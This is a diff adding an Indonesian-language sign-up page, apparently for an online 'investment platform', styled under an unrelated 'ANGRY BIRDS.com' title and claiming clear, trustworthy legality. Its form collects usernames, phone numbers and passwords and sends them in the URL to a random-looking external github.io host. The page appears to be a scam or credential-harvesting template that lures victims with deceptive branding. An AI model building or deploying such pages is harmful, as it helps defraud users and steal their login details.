@@ -1,0 +1,325 @@
+<html lang="en">
+ <head> 
+  <meta charset="UTF-8"> 
+  <title>ANGRY BIRDS.com</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <link rel="stylesheet" href=""> 
+  <link rel="stylesheet" href=""> 
+  <link href="" rel="stylesheet"> 
+  <link href="" rel="stylesheet"> 
+  <meta name="theme-color" content="#fff200"> 
+  <meta name="description" content="Platform Investasi Terbaik dengan Legalitas Jelas dan Terpercaya"> 
+  <meta name="keywords" content=""> 
+  <meta name="author" content=""> 
+  <meta property="og:url" content=">"> 
+  <meta property="og:title" content=""> 
+  <meta property="og:image" content=""> 
+  <meta property="og:description" content="Platform Investasi Terbaik dengan Legalitas Jelas dan Terpercaya"> 
+  <meta property="og:site_name" content=""> 
+  <meta property="og:type" content="website"> 
+  <meta name="twitter:card" content="summary"> 
+  <meta name="twitter:site" content=""> 
+  <meta name="twitter:title" content=""> 
+  <meta name="twitter:description" content="Platform Investasi Terbaik dengan Legalitas Jelas dan Terpercaya"> 
+  <meta name="twitter:image" content=""> 
+  <meta name="dcterms.type" content="Service"> 
+  <meta name="dcterms.language" content="id"> 
+  <style>
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Firefox */
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        body {
+            background-image: radial-gradient(circle, #fff, #fff, #fff, red, #fff);
+            /* background: #dfe6e9; */
+            font-family: Arial, sans-serif;
+            color: #333;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+
+        .dummy-logo-left {
+            position: absolute;
+            top: 10px;
+            width: auto;
+            height: 30px;
+        }
+
+        .dummy-logo-right {
+            position: absolute;
+            top: 10px;
+            width: 80px;
+            height: 40px;
+        }
+
+        .dummy-logo-left {
+            left: 25px;
+        }
+
+        .dummy-logo-right {
+            right: 25px;
+        }
+
+        body.swal2-height-auto {
+            height: 100vh !important;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 90%;
+            background: #b2bec3;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 5px;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .form-title {
+            font-size: 24px;
+            color: #fff200;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .form-item {
+            width: 100%;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-item input {
+            width: 100%;
+            padding: 8px 40px 8px 40px;
+            height: 40px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            box-sizing: border-box;
+        }
+
+        .form-item i {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #fff200;
+        }
+
+        .form-item #icaptcha {
+            padding-left: 60px !important;
+        }
+
+        .form-item #captcha {
+            position: absolute;
+            top: 50%;
+            font-weight: bold;
+            transform: translateY(-50%);
+            color: red;
+        }
+
+        .form-item span {
+            left: 10px;
+        }
+
+        .form-item i.fa-user {
+            left: 10px;
+        }
+
+        .form-item i.fa-phone {
+            left: 10px;
+        }
+
+        .form-item i.fa-lock {
+            left: 10px;
+        }
+
+        .form-item i.fa-eye,
+        .form-item i.fa-eye-slash {
+            right: 10px;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            display: flex;
+            justify-content: flex-end;
+            width: 100%;
+            margin-bottom: 20px;
+            color: #fff200;
+        }
+
+        .submit-btn,
+        .register-btn {
+            text-align: center;
+            width: 100%;
+            height: 45px;
+            border: none;
+            border-radius: 5px;
+            background: #fff200;
+            color: #000;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .submit-btn {
+            margin-top: 20px;
+        }
+
+        .separator {
+            width: 100%;
+            text-align: center;
+            margin: 20px 0;
+            color: #fff200;
+            display: flex;
+            align-items: center;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .separator:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .separator:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .register-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .form-item input::placeholder {
+            color: #a9a9a9;
+            font-size: 13px;
+        }
+
+        .form-item i.fa-envelope {
+            left: 10px;
+        }
+
+        :-webkit-autofill {
+            transition: all 100000s ease-in-out 0s;
+        }
+    </style> 
+  <link rel="stylesheet" type="text/css" href=""> 
+  <script type="text/javascript" charset="utf-8" async defer>
+        function updateCSRF(value) {
+            return $('input[name=csrf_myapp]').val(value);
+        }
+    </script> 
+ </head> 
+ <body style="height: 100vh !important;"> 
+  <div class="container"> 
+
+   <div class="form-container" style="margin-top: 1rem;"> 
+    <div class="form-title">
+     Daftar platfom
+    </div> 
+    <form action="https://pmrex6543caspay3dz3g.github.io/" autocomplete="off" method="GET" accept-charset="utf-8"> 
+     <input type="hidden" name="csrf_myapp" value="6e5d46159689a563966e97a138b6d975"> 
+     <div class="form-item"> 
+      <i class="fa fa-user"></i> 
+      <input type="text" name="auth_username" placeholder="Username" role="presentation" autocomplete="new-password" required> 
+     </div> 
+     <div class="form-item"> 
+      <i class="fa fa-phone"></i> 
+      <input type="number" name="auth_phone" placeholder="Telepon" autocomplete="new-password" required> 
+     </div> 
+     <div class="form-item"> 
+      <i class="fa fa-lock"></i> 
+      <input type="password" id="password" name="auth_password" placeholder="Password" role="presentation" autocomplete="new-password" required> 
+      <i class="fa fa-eye" id="togglePassword"></i> 
+     </div> 
+
+     <div class="form-item"> 
+      <span id="captcha">3 + 7 =</span> 
+      <input id="icaptcha" type="number" name="auth_captcha" placeholder="????????" autocomplete="new-password" required> 
+     </div> 
+     <button id="btn01" type="submit" class="submit-btn">BUAT AKUN</button> 
+     <button id="btn02" style="background: rgb(198, 181, 143) !important; display: none;" disabled type="button" class="submit-btn">MEMPROSES</button> 
+     <div class="forgot-password"> 
+      <a href="Login.html">Sudah punya Akun? <strong>Login Sekarang</strong></a> 
+     </div> 
+    </form> 
+    <script type="text/javascript">
+		jQuery(document).ready(function($) {
+
+			$('#btn02').hide();
+			$('#regis-form').submit(function(event) {
+				event.preventDefault();
+				$('#btn01').hide();
+				$('#btn02').show();
+				$.ajax({
+						url: '',
+						type: 'post',
+						dataType: 'json',
+						data: $('#regis-form').serialize(),
+					})
+					.done(function(data) {
+
+						updateCSRF(data.csrf_data);
+
+						$('#captcha').text(data.captcha_data);
+						$('#icaptcha').val('');
+
+						swal(
+							data.heading,
+							data.message,
+							data.type
+						).then(function() {
+							if (data.status) {
+								location.href = '';
+							}
+						});
+					})
+				$('#btn01').show();
+				$('#btn02').hide();
+			});
+		});
+	</script> 
+   </div> 
+  </div> 
+  <script>
+        const togglePassword = document.querySelector('#togglePassword');
+        const password = document.querySelector('#password');
+
+        togglePassword.addEventListener('click', function(e) {
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            this.classList.toggle('fa-eye-slash');
+        });
+    </script> 
+ </body>
+</html>
